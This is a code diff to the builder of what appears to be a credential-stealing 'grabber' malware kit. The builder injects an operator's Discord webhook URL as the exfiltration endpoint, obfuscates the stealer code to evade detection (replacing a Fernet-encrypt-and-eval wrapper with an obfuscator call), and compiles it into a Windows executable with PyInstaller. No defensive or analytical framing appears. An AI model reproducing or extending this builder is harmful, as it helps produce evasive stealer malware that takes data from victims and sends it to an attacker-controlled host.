@@ -48,15 +48,12 @@ def build(webhook: str, out_file: str, debug: bool):
     ot = f"{out_file}.exe"
     with open(grabber_path, 'r') as code_file:
         code = code_file.read()
-    index = code.find("WEBHOOK")
-    libs = code[0:index] + "\nfrom cryptography.fernet import Fernet\n"
-    content = code[index:-1].replace("{WEBHOOK}", str(webhook)).replace("https://discord.com/api/webhooks/", str(webhook))
-    encrypted_content = Fernet(fernet_key).encrypt(content.encode())
-    eval_code = encryptcodegod(f"\ncode = Fernet('{fernet_key}').decrypt({encrypted_content}).decode();eval(compile(code, '<string>', 'exec'))")
+
+    code = code.replace("{WEBHOOK}", str(webhook)).replace("https://discord.com/api/webhooks/", str(webhook))
+    code = BlankOBFv2(code=code, include_imports=True, recursion=1).obfuscate()
 
     with open(of, 'w') as build_file:
-        build_file.write(libs)
-        build_file.write(eval_code)
+        build_file.write(code)
 
     # Compile command for Windows
     compile_command = ["pyinstaller.exe"]
